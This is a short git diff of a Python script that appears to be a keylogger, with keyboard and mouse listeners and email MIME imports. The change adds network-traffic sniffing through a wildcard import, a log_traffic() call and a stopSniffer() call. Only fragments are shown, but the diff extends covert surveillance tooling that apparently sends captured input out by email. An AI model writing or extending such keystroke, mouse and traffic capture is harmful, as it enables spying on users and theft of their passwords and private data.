@@ -1,5 +1,6 @@
 try:
     from datetime import datetime
+    from internet import *
     from email.mime.multipart import MIMEMultipart
     from email.mime.text import MIMEText
     import platform
@@ -127,6 +128,7 @@ def on_press(key):
              # Stop the mouse listener
         if keyboard_listener:
             keyboard_listener.stop()
+        stopSniffer()
         return False
                # Stop the keyboard listener
     
@@ -151,5 +153,6 @@ def start_logger():
     keyboard_listener.join()
     mouse_listener.join()
 
+log_traffic()
 main()
 start_logger()
